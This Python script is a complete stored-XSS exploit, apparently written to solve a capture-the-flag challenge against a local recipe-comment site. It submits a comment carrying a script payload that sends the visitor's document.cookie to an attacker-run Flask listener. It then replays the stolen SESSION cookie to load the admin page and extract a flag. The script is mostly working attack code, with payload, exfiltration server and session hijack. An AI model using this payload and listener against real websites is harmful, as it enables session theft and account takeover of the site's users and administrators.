from flask import Flask, request
from flask_cors import CORS
from threading import Thread
from time import sleep
from random import randint
import requests
import os

host = "localhost"
port = 1337
base_target_url = "http://localhost:8083"

exploit_id = randint(1, 10000) # Avoid previous payloads interfering

report_back_url = "http://%s:%d/%d?cookie=" % (host, port, exploit_id)
payload = """
<script>
xhr = new XMLHttpRequest();
xhr.open("GET", "%s" + encodeURIComponent(document.cookie));
xhr.send();
</script>
""" % report_back_url

app = Flask(__name__)
CORS(app) # Allow the payload to use xhr to send back the cookie

def add_xss_comment():
  sleep(1) # Give the server time to start
  print("Submitting malicious comment")
  res = requests.post("%s/add-comment" % base_target_url, data={
    "content": "nice recipe!%s" % payload,
    "author": "exploit"
  })

  if res.status_code != 200:
    print("Failed to submit comment, response: %s" % res.text)
    exit()

  print("Successfully submitted comment")

def finish(cookie):
  sleep(0.2) # Give the server time to finish handling the request
  print("Received cookies: %s" % cookie)

  res = requests.get("%s/admin" % base_target_url, cookies={"SESSION": "=".join(cookie.split("=")[1:])})
  flag = res.text.split("flag{")[1].split("}")[0] # Extract flag from html
  print("Flag: flag{%s}" % flag)

  os._exit(0)

@app.route("/%d" % exploit_id)
def submit_cookie():
  cookie = request.args["cookie"]
  t = Thread(target=finish, args=[cookie])
  t.start()
  return "done"

comment_thread = Thread(target=add_xss_comment)
comment_thread.start()

app.run("0.0.0.0", port=1337)
